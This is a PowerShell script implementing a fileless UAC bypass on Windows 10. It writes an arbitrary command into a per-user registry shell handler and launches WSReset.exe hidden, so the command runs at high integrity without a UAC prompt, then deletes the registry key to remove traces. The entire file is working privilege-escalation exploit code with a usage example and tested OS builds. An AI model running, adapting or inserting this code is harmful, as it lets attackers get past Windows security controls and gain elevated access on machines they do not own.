<#
.SYNOPSIS
Fileless UAC Bypass by Abusing Shell API

Author: Hashim Jawad of ACTIVELabs

.PARAMETER Command
Specifies the command you would like to run in high integrity context.
 
.EXAMPLE
Invoke-WSResetBypass -Command "C:\Windows\System32\cmd.exe /c start cmd.exe"

This will effectivly start cmd.exe in high integrity context.

.NOTES
This UAC bypass has been tested on the following:
 - Windows 10 Version 1803 OS Build 17134.590
 - Windows 10 Version 1809 OS Build 17763.316
#>

function Invoke-WSResetBypass {
      Param (
      [String]$Command = "C:\Windows\System32\cmd.exe /c start cmd.exe"
      )

      $CommandPath = "HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command"
      $filePath = "HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command"
      New-Item $CommandPath -Force | Out-Null
      New-ItemProperty -Path $CommandPath -Name "DelegateExecute" -Value "" -Force | Out-Null
      Set-ItemProperty -Path $CommandPath -Name "(default)" -Value $Command -Force -ErrorAction SilentlyContinue | Out-Null
      Write-Host "[+] Registry entry has been created successfully!"

      $Process = Start-Process -FilePath "C:\Windows\System32\WSReset.exe" -WindowStyle Hidden
      Write-Host "[+] Starting WSReset.exe"

      Write-Host "[+] Triggering payload.."
      Start-Sleep -Seconds 5

      if (Test-Path $filePath) {
      Remove-Item $filePath -Recurse -Force
      Write-Host "[+] Cleaning up registry entry"
      }
}